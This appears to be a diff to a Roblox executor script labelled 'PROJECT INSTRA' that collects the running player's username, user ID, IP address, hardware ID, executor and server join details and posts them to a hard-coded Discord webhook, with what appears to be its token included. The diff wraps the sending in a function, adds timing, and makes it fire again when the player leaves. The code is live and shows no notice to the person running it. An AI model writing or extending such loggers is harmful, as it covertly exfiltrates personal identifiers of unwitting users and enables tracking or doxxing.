@@ -154,6 +154,9 @@ local LocalPlayer = Players.LocalPlayer
 
 local webhookURL = "https://discordapp.com/api/webhooks/1434794468325982281/Jf837vvcVpQ4zy1rfFS4NsT9_HFNukBKPqDIhagp9e02NAnQIHa4FlSLwTwCjKwybbm3"
 
+-- Track execution time
+local startTime = tick()
+
 -- Safe executor detection
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
@@ -186,51 +189,67 @@ local TeleportService = game:GetService("TeleportService")
 TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
 ]]
 
--- Embed content with [+] formatting
-local embed = {
-    ["title"] = "[PROJECT INSTRA] Execution Log",
-    ["description"] = table.concat({
-        "[+] Username: " .. LocalPlayer.Name,
-        "[+] Display Name: " .. LocalPlayer.DisplayName,
-        "[+] User ID: " .. tostring(LocalPlayer.UserId),
-        "[+] Executor: " .. executor,
-        "[+] IP Address: " .. ip,
-        "[+] HWID: " .. RbxAnalyticsService:GetClientId(),
-        "[+] Game Name: " .. gameName,
-        "[+] Game ID: " .. tostring(gameId),
-        "[+] Job ID: " .. jobId,
-        "[+] Players in Server: " .. tostring(playerCount),
-        "[+] Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
-        "",
-        "[+] JavaScript Join Code:",
-        "```js\n" .. jsJoinCode .. "\n```",
-        "[+] Lua Join Script:",
-        "```lua\n" .. luaJoinScript .. "\n```"
-    }, "\n"),
-    ["type"] = "rich",
-    ["color"] = 0x000000,
-    ["footer"] = { ["text"] = "Execution Log - Roblox" },
-    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-}
+-- Send log to Discord
+local function sendExecutionLog()
+    local duration = math.floor(tick() - startTime)
 
-local payload = HttpService:JSONEncode({
-    ["content"] = "",
-    ["embeds"] = {embed}
-})
+    local embed = {
+        ["title"] = "[PROJECT INSTRA] Execution Log",
+        ["description"] = table.concat({
+            "[+] Username: " .. LocalPlayer.Name,
+            "[+] Display Name: " .. LocalPlayer.DisplayName,
+            "[+] User ID: " .. tostring(LocalPlayer.UserId),
+            "[+] Executor: " .. executor,
+            "[+] IP Address: " .. ip,
+            "[+] HWID: " .. RbxAnalyticsService:GetClientId(),
+            "[+] Game Name: " .. gameName,
+            "[+] Game ID: " .. tostring(gameId),
+            "[+] Job ID: " .. jobId,
+            "[+] Players in Server: " .. tostring(playerCount),
+            "[+] Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
+            "[+] Execution Duration: " .. tostring(duration) .. " seconds",
+            "",
+            "[+] JavaScript Join Code:",
+            "```js\n" .. jsJoinCode .. "\n```",
+            "[+] Lua Join Script:",
+            "```lua\n" .. luaJoinScript .. "\n```"
+        }, "\n"),
+        ["type"] = "rich",
+        ["color"] = 0x000000,
+        ["footer"] = { ["text"] = "Execution Log - Roblox" },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
 
-local requestFunction = syn and syn.request or http_request or request
-if requestFunction then
-    requestFunction({
-        Url = webhookURL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = payload
+    local payload = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {embed}
     })
-else
-    warn("Your executor does not support HTTP requests.")
+
+    local requestFunction = syn and syn.request or http_request or request
+    if requestFunction then
+        requestFunction({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = payload
+        })
+    else
+        warn("Your executor does not support HTTP requests.")
+    end
 end
+
+-- Send on execution
+sendExecutionLog()
+
+-- Optionally send again on leave
+LocalPlayer.AncestryChanged:Connect(function(_, parent)
+    if not parent then
+        sendExecutionLog()
+    end
+end)
+
 
 
 
